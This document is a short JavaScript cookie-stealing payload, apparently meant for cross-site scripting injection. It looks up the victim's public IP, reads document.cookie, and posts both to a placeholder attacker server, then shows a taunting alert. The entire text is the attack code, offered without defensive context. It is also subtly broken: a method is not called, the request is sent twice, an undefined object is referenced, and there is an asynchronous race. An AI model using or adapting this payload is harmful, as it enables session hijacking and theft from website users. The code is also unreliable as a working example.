var victim_ip;
fetch('https://api.ipify.org?format=json')
  .then(response => response.json)
  .then(data => victim_ip = data.ip);

var document_cookie = document.cookie;

const xhr = new XMLHttpRequest();
xhr.open("POST","https://<attack_server_hostname>:<port>/");
var params = 'victim_ip='+victim_ip+"&document_cookie="+document_cookie;
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
xhr.send();
xhr.onreadystatechange = function() {
  if(xhr.readyState == 4 && http.status == 200) {
    alert('should have locked your cookie jar');
  }
}

xhr.send(params);
